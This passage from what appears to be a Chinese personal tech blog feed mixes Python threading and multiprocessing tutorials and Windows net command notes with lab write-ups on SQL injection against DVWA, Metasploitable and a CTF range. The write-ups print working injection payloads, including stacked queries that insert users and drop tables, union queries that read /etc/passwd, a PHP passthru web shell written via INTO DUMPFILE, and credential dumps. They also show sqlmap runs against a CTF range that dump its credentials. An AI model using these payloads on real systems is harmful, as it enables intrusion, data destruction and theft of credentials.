但是在有些站点无法运行该语句，是sql客户端的问题代码存在问题，导致注入失败【原因】 数据库评估软件hexorBase（用于破解或连接数据库的软件） 插入一条新用户 1'; IINSERT INTO users( user_id, first_name, last_name, user, password, avatar) VALUES(10,'gali','yy', 'galiyy', '5f4dcc3b5aa765d61d8327deb882cf99', 'ok');-- 删除一张表 1'; DROP TABLE users; -- 源码分析Low12345678910111213141516171819202122232425262728&lt;?php if(isset($_GET['Submit']))&#123; // Retrieve data $id = $_GET['id']; $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'"; $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); $num = mysql_numrows($result); $i = 0; while ($i &lt; $num) &#123; $first = mysql_result($result,$i,"first_name"); $last = mysql_result($result,$i,"last_name"); echo '&lt;pre&gt;'; echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last; echo '&lt;/pre&gt;'; $i++; &#125;&#125;?&gt; 获取id值没有进行任何过滤，只需注意引号的闭合即可注入 Medium123456789101112131415161718192021222324252627282930&lt;?phpif (isset($_GET['Submit'])) &#123; // Retrieve data $id = $_GET['id']; $id = mysql_real_escape_string($id); # 对一些字符进行了转义 $getid = "SELECT first_name, last_name FROM users WHERE user_id = $id"; # id值没有引号闭合 $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); $num = mysql_numrows($result); $i=0; while ($i &lt; $num) &#123; $first = mysql_result($result,$i,"first_name"); $last = mysql_result($result,$i,"last_name"); echo '&lt;pre&gt;'; echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last; echo '&lt;/pre&gt;'; $i++; &#125;&#125;?&gt; id值被mysql_real_escape_string()函数进行一些字符的转移，但是仔细观察，后面的SQL语句中id值并没有引号闭合，故此过滤函数为多余的 mysql_real_escape_string() 【php5.5.0已经弃用该函数，PHP 7.0.0已经删除该函数，使用MySQLi、PDO_MySQL代替】转义的字符： \x00 \n \r \ ‘ “ \x1a High123456789101112131415161718192021222324252627282930313233&lt;?php if (isset($_GET['Submit'])) &#123; // Retrieve data $id = $_GET['id']; $id = stripslashes($id); # 去掉'\' $id = mysql_real_escape_string($id); # 对一些字符进行转义 if (is_numeric($id))&#123; # 判断id值是否为数字 $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'"; $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); $num = mysql_numrows($result); $i=0; while ($i &lt; $num) &#123; $first = mysql_result($result,$i,"first_name"); $last = mysql_result($result,$i,"last_name"); echo '&lt;pre&gt;'; echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last; echo '&lt;/pre&gt;'; $i++; &#125; &#125;&#125;?&gt; 不仅对字符进行了过滤，还加了数字的判断，目前未发现可绕过的方法]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[墨者-SQL注入漏洞测试(布尔盲注)]]></title>
    <url>%2F2019%2F07%2F23%2F%E5%A2%A8%E8%80%85-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%2F</url>
    <content type="text"><![CDATA[Background 一位热心的网友再次向“墨者”安全工程师挑战，“墨者”工程师在注入时发现网页无回显，“墨者”工程师想了一会就注入完成拿到了key。 靶场页面 发现注入点在登陆页面的 “维护停机” 存在注入点 查询数据库利用sqlmap查询当前该站点的数据库 1sqlmap.py -u "http://219.153.49.228:47719/new_list.php?id=1" --current-db 获得数据库名称 stormgroup 查询表名1sqlmap.py -u "http://219.153.49.228:47719/new_list.php?id=1" -D stormgroup --tables 获得表名 member、 notice 查询列名1sqlmap.py -u "http://219.153.49.228:47719/new_list.php?id=1" -D stormgroup -T member --columns 获得列名字段 name、 password、 status 查询用户名密码1sqlmap.py -u "http://219.153.49.228:47719/new_list.php?id=1" -D stormgroup -T member -C name,password --dump 密码为MD5加密，在线破解be92492fa64d6126726a71584a75a878 登陆后台用解密后的用户名和密码登陆后台获取key值]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python-多线程threading]]></title>
    <url>%2F2019%2F07%2F21%2FPython-%E5%A4%9A%E7%BA%BF%E7%A8%8Bthreading%2F</url>
    <content type="text"><![CDATA[Python多线程&emsp;&emsp;线程（thread）是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。 进程是资源分配的最小单位，线程是CPU调度的最小单位，每一个进程中至少有一个线程。 线程的特点&emsp;&emsp;在多线程OS中，通常是在一个进程中包括多个线程，每个线程都是作为利用CPU的基本单位，是花费最小开销的实体。 轻型实体；&emsp;&emsp;线程中的实体基本上不拥有系统资源，只是有一点必不可少的、能保证独立运行的资源。&emsp;&emsp;线程的实体包括程序、数据和TCB。线程是动态概念，它的动态特性由线程控制块TCB（Thread Control Block）描述。 独立调度和分派的基本单位；&emsp;&emsp;在多线程OS中，线程是能独立运行的基本单位，因而也是独立调度和分派的基本单位。由于线程很“轻”，故线程的切换非常迅速且开销小（在同一进程中的）。 可并发执行；&emsp;&emsp;在一个进程中的多个线程之间，可以并发执行，甚至允许在一个进程中所有线程都能并发执行；同样，不同进程中的线程也能并发执行，充分利用和发挥了处理机与外围设备并行工作的能力。 共享进程资源；&emsp;&emsp;在同一进程中的各个线程，都可以共享该进程所拥有的资源，这首先表现在：所有线程都具有相同的地址空间（进程的地址空间），这意味着，线程可以访问该地址空间的每一个虚地址；此外，还可以访问进程所拥有的已打开文件、定时器、信号量机构等。由于同一个进程内的线程共享内存和文件，所以线程之间互相通信不必调用内核。 创建线程python的thread模块是比较底层的模块，python的threading模块是对thread做了一些包装的，可以更加方便的被使用 1class threading.Thread(group=None, target=None, name=None, args=(), kwargs=&#123;&#125;, *, daemon=None) 参数： group：目前此参数为None，在实现ThreadGroup类时为将来的扩展保留。 target：target接收的是一个函数的地址，由run()方法调用执行函数中的内容。默认为无，表示未调用任何内容。 name ：线程名，可自行定义。 args：target接收的是函数名，此函数的位置参数以元组的形式存放在args中，用于执行函数时调用。 kwargs ：target接收的是函数名，此函数的关键字参数以字典的形式存放在kwargs中，用于执行函数时调用。 daemon：如果为True表示该线程为守护线程。方法： threading模块的方法： threading.currentThread(): 返回当前的线程变量。 threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。 threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。 Thread类方法： start()：开启线程，一个Thread对象只能调用一次start()方法，如果在同一线程对象上多次调用此方法，则会引发RuntimeError。 run()：执行start()方法会调用run()，该方将创建Thread对象时传递给target的函数名，和传递给args、kwargs的参数组合成一个完整的函数，并执行该函数。run()方法一般在自定义Thead类时会用到。 join(timeout=None)：join会阻塞、等待线程，timeout单位为秒，因为join（）总是返回none，所以在设置timeout调用join（timeout）之后，需要使用isalive（）判断线程是否执行完成，如果isalive为True表示线程在规定时间内没有执行完，线程超时。如果join(timeout=None)则会等待线程执行完毕后才会执行join（）后面的代码，一般用于等待线程结束。 name：获取线程名。 getName()：获取线程名。 setName(name)：设置线程名。 ident：“线程标识符”，如果线程尚未启动，则为None。如果线程启动是一个非零整数。 is_alive()：判断线程的存活状态，在run（）方法开始之前，直到run（）方法终止之后。如果线程存活返回True，否则返回False。 daemon：如果thread.daemon=True表示该线程为守护线程，必须在调用Start（）之前设置此项，否则将引发RuntimeError。默认为False isDaemon()：判断一个线程是否是守护线程。 setDaemon(daemonic)：设置线程为守护线程。 thread创建线程123456789101112import threadingimport timeimport osdef test(num): print("线程--- %d" % num) time.sleep(2)if __name__ == '__main__': for i in range(5): t = threading.Thread(target=test,args=(i,)) t.start() 执行结果： 12345线程--- 0线程--- 1线程--- 2线程--- 3线程--- 4 thread子类创建线程1234567891011121314import threadingimport timeclass MyThread(threading.Thread): # 重写run方法 def run(self): for i in range(3): time.sleep(1) print(self.name + "\t" + str(i))if __name__ == '__main__': for i in range(5): # 创建5个线程 t = MyThread() t.start() 执行结果： 123456789101112131415Thread-1 0Thread-2 0Thread-3 0Thread-5 0Thread-4 0Thread-2 1Thread-1 1Thread-3 1Thread-5 1Thread-4 1Thread-2 2Thread-1 2Thread-4 2Thread-3 2Thread-5 2 共享全局变量利用线程对变量num分别加1000000次： 1234567891011121314151617181920212223from threading import Threadimport time# 定义一个全局变量num = 0def test1(): global num for i in range(1000000): num += 1 print("当前值--num:%d"%num)def test2(): global num for i in range(1000000): num += 1 print("当前值--num:%d"%num)if __name__ == '__main__': t1 = Thread(target=test1) # 线程1 t2 = Thread(target=test2) # 线程2 t1.start() # time.sleep(2) # 可通过延时保证test1执行完毕 t2.start() 执行结果： 12当前值--num:1196015当前值--num:1458177 # 执行结果不为2000000，且每次结果不一样 python之间线程是可以共享同一进程中的所有资源，包括变量。但为什么上述代码执行结果不是2000000，这和操作系统的cpu处理速度和调度算法有关，“ num += 1 ” 可以看成 “ num = num + 1 ”，分为两部，先加法，再赋值；例如当num=1000，线程1的num加法执行完，要进行赋值“num = 1001”时，cpu切换了线程，执行线程2，执行了一个时间片后，再回到线程1，尽管这时num的值叠加了好几轮，执行了“num = 1001”，num的值就又回到原点了；同时执行两个线程没有达到预期效果。总结： 在一个进程内的所有线程共享全局变量，能够在不适用其他方式的前提下完成多线程之间的数据共享 缺点就是，线程是对全局变量随意遂改可能造成多线程之间对全局变量的混乱（即线程非安全） 互斥锁当多个线程几乎同时修改某一个共享数据的时候，需要进行同步控制线程同步能够保证多个线程安全访问竞争资源，最简单的同步机制是引入互斥锁。 线程同步：即当有一个线程在对内存进行操作时，其他线程都不可以对这个内存地址进行操作，直到该线程完成操作， 其他线程才能对该内存地址进行操作，而其他线程又处于等待状态，实现线程同步的方法有很多，临界区对象就是其中一种。 互斥锁为资源引入一个状态：锁定/非锁定。 某个线程要更改共享数据时，先将其锁定，此时资源的状态为“锁定”，其他线程不能更改；直到该线程释放资源，将资源的状态变成“非锁定”，其他的线程才能再次锁定该资源。互斥锁保证了每次只有一个线程进行写入操作，从而保证了多线程情况下数据的正确性。 threading模块中定义了Lock类，可以方便的处理锁定： 123456#创建锁mutex = threading.Lock()#锁定mutex.acquire([blocking])#释放mutex.release() 其中，锁定方法acquire可以有一个blocking参数。 如果设定blocking为True，则当前线程会堵塞，直到获取到这个锁为止（如果没有指定，那么默认为True） 如果设定blocking为False，则当前线程不会堵塞 使用互斥锁实现上面的例子的代码如下： 123456789101112131415161718192021222324252627282930from threading import Thread, Lock# 定义一个全局变量num = 0# 创建锁,默认没有上锁mutex = Lock()def test1(): global num # 上锁 mutex.acquire() # 如果有一方上锁，则另一方则会进入堵塞状态 for i in range(1000000): num += 1 # 解锁 mutex.release() print("当前值--num:%d"%num)def test2(): global num mutex.acquire() for i in range(1000000): num += 1 mutex.release() print("当前值--num:%d"%num)if __name__ == '__main__': t1 = Thread(target=test1) # 线程1 t2 = Thread(target=test2) # 线程2 t1.start() t2.start() 执行结果： 12当前值--num:1000000当前值--num:2000000 死锁在线程间共享多个资源的时候，如果两个线程分别占有一部分资源并且同时等待对方的资源，就会造成死锁。 尽管死锁很少发生，但一旦发生就会造成应用的停止响应。下面看一个死锁的例子 1234567891011121314151617181920212223242526272829303132333435363738394041import threadingimport timemutexA = threading.Lock()mutexB = threading.Lock()class Thread1(threading.Thread): # 重写run方法 def run(self): if mutexA.acquire(): # mutexA上锁 print(self.name + "-------acquire mutexA") time.sleep(1) # 保证mutexA、mutexB都堵塞 if mutexB.acquire(): # 等待Thread2释放mutexB print(self.name + "-------acquire mutexB") mutexB.release() print(self.name + "-------release mutexB") mutexA.release() print(self.name + "-------release mutexA")class Thread2(threading.Thread): # 重写run方法 def run(self): if mutexB.acquire(): # mutexB上锁 print(self.name + "-------acquire mutexB") time.sleep(1) if mutexA.acquire(): # 等待Thread1释放mutexA print(self.name + "-------acquire mutexA") mutexA.release() print(self.name + "-------release mutexA") mutexB.release() print(self.name + "-------release mutexB")if __name__ == '__main__': t1 = Thread1() t2 = Thread2() t1.start() t2.start() 注：time.sleep(1)的作用是保证两个线程都抢占到资源；由于代码比较少，cpu运行速度快，延时的作用防止线程1直接执行完，而看不到结果线程1和线程2各自等待对方资源释放，这样就陷入死锁了。执行结果： 123Thread-1-------acquire mutexAThread-2-------acquire mutexB （...死锁） 避免死锁的方法 增加超时时间 银行家算法 百度百科参考博客]]></content>
      <categories>
        <category>python系统编程</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动挖掘漏洞-SQL注入（二）]]></title>
    <url>%2F2019%2F07%2F19%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[通过SQL注入读取文件、写入文件、保存下载数据库(拖库) 读取文件这里以读取系统本地账号密码为例 1' union select null, load_file('/etc/passwd') -- 写入文件工具burpsuite 往服务器端插入php一句话木马，INTO DUMPFILE：MySQL函数，将输入保存成文件下载至本地（服务器） 1' union select null,"&lt;?php passthru($_GET['cmd']); ?&gt;" INTO DUMPFILE "/var/www/a.php" -- 很可惜，无法写入，原因是没有权限，现有的只有mysql的权限一般来说，不同的服务都有其特定的用户账号，而账号都有其一定权限，而这些权限仅局限于自己服务的主目录下，没有权限向其他目录读些东西，这里的/var/www/目录的权限是： 12msfadmin@metasploitable:/var/www$ ls -lddrwxr-xr-x 10 www-data www-data 4096 2012-05-20 15:31 . 所以这里我选择写入默认路径， 1' union select null,"&lt;?php passthru($_GET['cmd']); ?&gt;" INTO DUMPFILE "a.php" -- 但是写入后，我们且会因没有权限而无法利用上传的脚本 当无权限进行指定目录写入文件时，可使用文件包含漏洞 这里我们可以把脚本到/temp目录，这个目录是linux的通用目录，可以读写，虽然还是没有执行权限 1' union select null,"&lt;?php passthru($_GET['cmd']); ?&gt;" INTO DUMPFILE "/tmp/a.php" -- 写入之后，配合文件包含漏洞，命令执行 也可以上传一些shell脚本 选择反弹连接的shell，修改里面参数 因为服务器一般会有过滤机制，所以可以对shell进行编码再上传 1root@kali:/test# cat shell.php | xxd -ps | tr -d &quot;\n&quot; xxd -ps： 编码成16进制tr -d “\n”： 删除换行符 保存下载数【拖库】1' union select null, concat(user,0x3a,password) from users INTO OUTFILE '/tmp/a.db'--]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python多进程拷贝文件]]></title>
    <url>%2F2019%2F07%2F18%2Fpython%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%8B%B7%E8%B4%9D%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Python多进程拷贝实现思路 创建可获取目标文件或文件夹中的所有文件夹和文件的列表的函数 创建拷贝文件的函数 主函数创建进程池和消息队列 获取文件夹和文件列表先判断路径是文件还是文件夹，是文件直接添加至文件列表；文件夹的话，添加至文件夹列表，利用os.listdir()函数列出当前文件夹内的所有文件，循环遍历，拼接源地址，然后作为参数递归循环； 12345678910111213def get_file_list(source_path): """ 遍历该文件夹中的所有文件和文件夹 获取源文件夹中的文件夹、文件列表 """ if os.path.isdir(source_path): S_Dir_List.append(source_path) for temp in os.listdir(source_path): # 拼接源地址+文件名，变成新地址，再进行递归 new_source_path = os.path.join(source_path, temp) get_file_list(new_source_path) else: S_File_List.append(source_path) 拷贝文件传入的参数 queue： 消息队列，用于主函数计数 source_file： 源文件路径 dest_file： 目标文件的路径 循环读取写入，是防止文件过大，读写卡死 12345678910111213141516171819def copy_file(queue, source_file, dest_file): """ 复制文件从源文件 """ try: fr = open(source_file,"rb") fw = open(dest_file,"wb") except Exception as e: print("error:" + str(e)) else: while True: content = fr.read(4096) if not content: break fw.write(content) fr.close() fw.close() # 将文件名传入队列消息，代表复制完成 queue.put(source_file) 源代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from multiprocessing import Manager, Poolimport osimport time# 源文件列表 文件夹列表S_File_List = []S_Dir_List = []def get_file_list(source_path): """ 遍历该文件夹中的所有文件和文件夹 获取源文件夹中的文件夹、文件列表 """ if os.path.isdir(source_path): S_Dir_List.append(source_path) for temp in os.listdir(source_path): # 拼接源地址+文件名，变成新地址，再进行递归 new_source_path = os.path.join(source_path, temp) get_file_list(new_source_path) else: S_File_List.append(source_path)def copy_file(queue, source_file, dest_file): """ 复制文件从源文件 """ try: fr = open(source_file,"rb") fw = open(dest_file,"wb") except Exception as e: print("error:" + str(e)) else: while True: content = fr.read(4096) if not content: break fw.write(content) fr.close() fw.close() # 将文件名传入队列消息，代表复制完成 queue.put(source_file)def main(): # 获取源文件夹中的所有文件和文件夹 source_path = input("请输入要拷贝的源文件路径：") get_file_list(source_path) # 创建目标文件夹 dest_path = source_path + "-[复件]" for sour_dir in S_Dir_List: # 替换文件的路径 dest_dir = sour_dir.replace(source_path, dest_path) try: os.mkdir(dest_dir) except Exception as e: print("error" + str(e)) # 创建进程池 pool = Pool(5) queue = Manager().Queue() # 创建队列消息用来计数 for sour_file in S_File_List: # 替换文件的路径 dest_file = sour_file.replace(source_path,dest_path) # print(dest_file) # 往进程池添加任务 pool.apply_async(copy_file, args=(queue, sour_file, dest_file)) pool.close() # 关闭进程池 pool.join() # 等待子进程结束 # 显示复制文件的进度 filesNums = len(S_File_List) COUNT = 0 while True: queue.get() COUNT += 1 Rate = COUNT/filesNums print("\r当前进度： %.2f%%"%(Rate*100), end='') if Rate &gt;= 1: break print("\n...Done")if __name__ == '__main__': main()]]></content>
      <categories>
        <category>python系统编程</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的DOS命令]]></title>
    <url>%2F2019%2F07%2F16%2F%E5%B8%B8%E8%A7%81%E7%9A%84DOS%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[介绍常用的dos命令 1.Net命令在Dos命令提示符下输入 “net” 、 “net /?” 或 “net help”，可以获得帮助信息。1234NET [ ACCOUNTS | COMPUTER | CONFIG | CONTINUE | FILE | GROUP | HELP | HELPMSG | LOCALGROUP | PAUSE | SESSION | SHARE | START | STATISTICS | STOP | TIME | USE | USER | VIEW ] net view 作用：显示域列表、计算机列表或指定计算机的共享资源列表。 1命令格式：Net view [\\computername | /domain[:domainname]] 参数： 不带参数的 “net view” ，显示当前域的计算机列表 “\computername” ，指定要查看其共享资源的计算机 “/domain[:domainname]” ，指定要查看其可用计算机的域如：12Net view \\ABC #查看ABC计算机的共享资源列表Net view /domain:XYZ #查看XYZ域中的机器列表。 net user 作用：添加或更改用户帐号或显示用户帐号信息。 1命令格式：Net user [username [password | *] [options]] [/domain] 参数： 不带参数的“Net user” ，查看计算机上的用户帐号列表 “username” 用于添加、删除更改或查看用户的账号名 “password” 用于为用户账号分配或更改密码 “*” 提示输入密码 “/domain” 在计算机主域的主域控制器中执行操作 “net user” 命令一般配合 “net loaclgroup”命令使用，用于添加用户，以及提升yoghurt到管理员组中。 123命令格式：net loaclgroup [groupname [/COMMENT:&quot;text&quot;]] [/DOMAIN] groupname &#123;/ADD [/COMMENT:&quot;text&quot;] | /DELETE&#125; [/DOMAIN] groupname name [...] &#123;/ADD | /DELETE&#125; [/DOMAIN] 参数： 不带参数的 “net localgroup” 命令，可显示服务器和计算机的本地组名称 “groupname” 表示添加、扩充或删除的本地组名称 “/COMMENT:”text”” 表示为新建或现有的组添加注释 “/DOMAIN” 表示在当前域的主域控制器中执行操作，否则仅在本地计算机上执行操作 “name […]” 列出要添加到本地组或从本地组删除的一个或多个用户名或组名 “/add” 用于将全局组名或用户名添加到本地组中 “/delete” 用于从本地组中删除组名或用户名如，将用户名“test”, 密码“12345678” 的用户添加至管理员组中 1234net user # 查看用户net user test 12345678 /add # 添加用户net localgroup Administrators test /add # 添加至管理员组net localgroup Administrators # 查看管理员组 net use 作用：用于查看连接的计算机，断开计算机与共享资源的连接，或者显示计算机的连接信息 1234567891011命令格式：NET USE[devicename | *] [\\computername\sharename[\volume] [password | *]] [/USER:[domainname\]username] [/USER:[dotted domain name\]username] [/USER:[username@dotted domain name] [/SMARTCARD] [/SAVECRED] [/REQUIREINTEGRITY] [/REQUIREPRIVACY] [[/DELETE] | [/PERSISTENT:&#123;YES | NO&#125;]] 参数： 输入不带参数 “net use” 命令，可列出网络连接 “devicename” 用于指定要连接的资源名称或要断开的设备名称 “\\computername\sharename” 表示服务器及共享资源的名称 “password” 表示访问共享资源的密码 “*” 提示输入密码 “/user” 用于指定进行连接的另外一个用户 “domainname” 用于指定另一个域 “username” 用于指定登陆的用户名 “/home” 用于将用户连接到其宿主主目录 “/delete” 用于取消指定的网络连接 “/persistent” 用于控制永久网络连接的使用 net time 作用：用于查看系统时间，或用于同步其他计算机域的时钟 123命令格式：NET TIME[\\computername | /DOMAIN[:domainname] | /RTSDOMAIN[:domainname]] [/SET] 参数： “computename” 表示要检查或同步的服务器名 “/DOMAIN[:domainname]” 用于指定要与其时间同步的域 “/set” 用于使本计算机时钟与指定计算机或域的时钟同步 net statisics 作用：用于显示本地工作站的统计记录 123命令格式：NET STATISTICS[WORKSTATION] net share 作用：用于创建、删除或显示共享资源 123456789101112命令格式：NET SHAREsharename sharename=drive:path [/GRANT:user,[READ | CHANGE | FULL]] [/USERS:number | /UNLIMITED] [/REMARK:&quot;text&quot;] [/CACHE:Manual | Documents| Programs | BranchCache | None] sharename [/USERS:number | /UNLIMITED] [/REMARK:&quot;text&quot;] [/CACHE:Manual | Documents | Programs | BranchCache | None] &#123;sharename | devicename | drive:path&#125; /DELETE sharename \\computername /DELETE 参数： 不带参数 “net share” 表示共享资源的绝对路径 “sharename” 表示共享资源的网络名称 “drive:path” 用于指定共享目录的绝对路径 “/users:number” 用于设置可同时访问共享资源的最大用户数 “unlimited” 表示不限制同时访问共享资源的最大用户数 “/remark:”text”” 用于添加关于资源的注释，注释文字用引号包裹### net share 作用：用于创建、删除或显示共享资源 net session 作用：用于列出或断开本地计算机和与之连接的客户端的会话，也可以写成“net sessions”或“net sess” 123命令格式：NET SESSION[\\computername] [/DELETE] [/LIST] 参数： 不带参数 “net session” 显示所有与本地计算机的会话信息 “computername” 用于标识要列出或断开会话的计算机 “/delete” 用于结束与“computername”计算机的会话，并关闭本次会话期间计算机的所有进程 Ipconfig“ipconfig”和“ipconfig /all” 用于查看网络的配置情况。]]></content>
      <categories>
        <category>windows基础</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>dos命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动挖掘漏洞---SQL注入（一）]]></title>
    <url>%2F2019%2F07%2F15%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[SQL注入 所谓SQL注入，就是通过使用POST或GET方式把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 程序存在SQL注入，追其原因，就是代码或编码的不完善 如常见的用户登陆，举个简单的例子： 1SELECT * FROM users WHERE user='uname' AND password='pass' 一般情况下，通过布尔判断，只要SQL语句为真，即为登陆成功。这句SQL语句意思是查询users表中是否存在用户名为uname，密码为pass的用户，语句为真即登陆成功，语句为假即登陆失败。 若在不知道用户名和密码的情况下，我们可以将【pass】替换为【’ or 1=1 – 】 1SELECT * FROM users WHERE user='uname' AND password='' or 1=1 -- ' 注:【– 】 可以用来注释掉后边的语句。根据布尔判断，这句话就可以成真了，登陆成功 一些简单判断是否存在SQL注入的方法： 基于报错的检测方法(low) ‘ “ % ( ) 基于布尔的检测 1’ and ‘1’=’1 &emsp;或&emsp; 1’ and ‘1 1’ and ‘1’=’2 &emsp;或&emsp; 1’ and ‘0 表列数/显示信息位于哪一列 ‘ order by 9–+ #按查询列号 （如select * from table order by n 表示select里面的第n个字段） select * 时表字段数=查询字段数 联合查询 ‘ union select 1,2–+ ‘ union all select database(),2–+（联合查询前后语句的查询字段数要相等） 下面用metasploitable中的dvwa(low)进行演示这个提交表单作用是根据用户输入id ，返回用户的first_name、subname； 当我们不根据规则，输入一些不规范的数据，如“’”网页报错了，并返回了信息，可以判断是MySQL的数据库，错误原因是引号无法闭合。也可以利用布尔值判断当输入1’ and ‘1’=’1 ，语句为真，程序执行 ；1’ and ‘1’=’2 ，语句为假，程序不执行； 基于这些判断，就可以认为存在SQL注入现在可以猜解select中的字段个数，利用“order by”语句 可以从1开始（注意空格）当数值到3时，网页报错 “Unknown column ‘3’ in ‘order clause’”说明，查询的字段个数为2； 然后我们可以利用联合查询语句，查询一些有用的信息因为union查询前后查询字段个数要相等，这里用1，2代替，1，2也可以替换成一些函数 ‘ union select database(),substring_index(user(),”@”,1) – （字符串截取substring_index(str, “分隔符”，计数)）利用hackbar构造语句提交 常用可SQL查询内容： DB用户：user() DB版本：version() 全局函数：@@datadir、@@hostname、@@VERSION、@@version_compile_os 当前库： database() ASCII转字符：char() 连接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version()) 计算哈希：md5() Mysql 数据结构 information_schema 使用连接字符串函数查询（ascii码中，32为空格，58为冒号：） Mysql数据结构 对表的meta data的查询需要使用information_schema.tables， table_schema是数据库的名称，table_name是具体的表名，table_type指的是表的类型MySQL：所有的元数据都保存在一张元数据表【information_schema】 查看所有库所有表/统计库中表的数量1' union select table_name,table_schema from information_schema.tables -- 查询所有数据库中的所有表 1' union select table_schema,count(*) from information_schema.tables group by table_schema -- 统计每个数据库中的表数量 Dvwa库中的表名1' union select table_schema,table_name from information_schema.tables where table_schema='dvwa' -- 查询dvwa库的表 查询列名字段1' union select table_name,column_name from information_schema.columns where table_schema="dvwa" and table_name="users" -- 查询users表中的列名字段 查询表中数据1' union select user,password from dvwa.users -- 查询users表中的用户名、密码 到这里，用户名和密码都知道了，但是密码是加密过的，我们可以通过在线或离线的破解可以利用一些工具对密码使用的加密方式进行判断 1root@kali:/# hash-identifier 判断出来是md5哈希加密这里用离线破解的方式先将用户名密码保存至文件夹，格式如下用john进行破解 1root@kali:/# john --format=raw-MD5 dvwa.txt 如果出现以下错误，说明命令已经执行过了 123Using default input encoding: UTF-8Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])No password hashes left to crack (see FAQ) 命令执行后，会在“~”家目录里生成.john/的文件夹，里面有日志和破解后的明文文件要再执行，删除这两个文件即可]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[进程池Pool & 进程间通信Queue]]></title>
    <url>%2F2019%2F07%2F12%2F%E8%BF%9B%E7%A8%8B%E6%B1%A0Pool-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1Queue%2F</url>
    <content type="text"><![CDATA[进程池Pool当需要创建的子进程数量不多时，可以直接利用multiprocessing中的Process动态成生多个进程，但如果是上百甚至上千个目标，手动的去创建进程的工作量巨大，此时就可以用到multiprocessing模块提供的Pool方法。 初始化Pool时，可以指定一个最大进程数，当有新的请求提交到Pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到指定的最大值，那么该请求就会等待，直到池中有进程结束，才会用之前的进程来执行新的任务，请看下面的实例： 1234567891011121314151617181920212223242526from multiprocessing import Poolimport osimport randomimport timedef worker(num): # for i in range(5): # print('---进程号: %d ---num=%d----'%(os.getpid(), num)) # time.sleep(1) print('---进程号: %d ---num=%d----'%(os.getpid(), num)) time.sleep(2)if __name__ == '__main__': pool = Pool(3) # 创建进程池， 进程数=3 for i in range(10): print("----添加任务：%d-----"%i) pool.apply_async(worker, (i,)) # 非堵塞式添加 # pool.apply(worker, (i,)) # 堵塞式添加 # 向进程池中添加任务数=10， 若添加的函数有参数，以元组的方式传入 pool.close() # 关闭进程池，不再添加新任务 pool.join() # 等待子进程都结束，主进程再结束 # 不然 主进程会在添加完任务后就结束 执行结果: 1234567891011121314151617181920----添加任务：0---------添加任务：1---------添加任务：2---------添加任务：3---------添加任务：4---------添加任务：5---------添加任务：6---------添加任务：7---------添加任务：8---------添加任务：9--------进程号: 13608 ---num=0-------进程号: 17324 ---num=1-------进程号: 2716 ---num=2-------进程号: 13608 ---num=3-------进程号: 17324 ---num=4-------进程号: 2716 ---num=5-------进程号: 13608 ---num=6-------进程号: 17324 ---num=7-------进程号: 2716 ---num=8-------进程号: 13608 ---num=9---- 非堵塞式添加和堵塞式添加阻塞与非阻塞指的是程序的两种运行状态 